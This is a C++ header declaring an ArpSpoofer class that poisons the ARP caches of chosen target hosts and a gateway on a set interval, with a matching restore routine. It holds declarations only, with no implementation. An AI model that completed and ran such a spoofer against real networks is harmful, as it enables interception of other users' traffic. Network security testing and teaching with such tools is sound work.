#pragma once
#include "types.h"
#include <thread>
#include <atomic>
#include <vector>

namespace phantom {

class ArpSpoofer {
public:
    ArpSpoofer();
    ~ArpSpoofer();

    void SetInterface(const std::string& iface);
    void SetGateway(IPv4Address gw, MacAddress gw_mac);
    void AddTarget(IPv4Address target, MacAddress target_mac);
    void SetInterval(int seconds);
    void EnableGatewaySpoof(bool enable);
    void EnableTargetSpoof(bool enable);

    bool Start();
    void Stop();
    void RestoreAll();

    bool IsRunning() const { return running_; }

private:
    void SpoofLoop();
    void SendArpPoison(IPv4Address victim_ip, MacAddress victim_mac,
                        IPv4Address spoof_ip);
    void SendArpRestore(IPv4Address victim_ip, MacAddress victim_mac,
                         IPv4Address target_ip, MacAddress target_mac);

    std::string interface_;
    IPv4Address gateway_ip_;
    MacAddress gateway_mac_;
    IPv4Address local_ip_;
    MacAddress local_mac_;

    struct Target {
        IPv4Address ip;
        MacAddress mac;
    };
    std::vector<Target> targets_;

    int interval_seconds_ = 5;
    bool spoof_gateway_ = true;
    bool spoof_targets_ = true;
    std::atomic<bool> running_{false};
    std::thread thread_;
};

} // namespace phantom
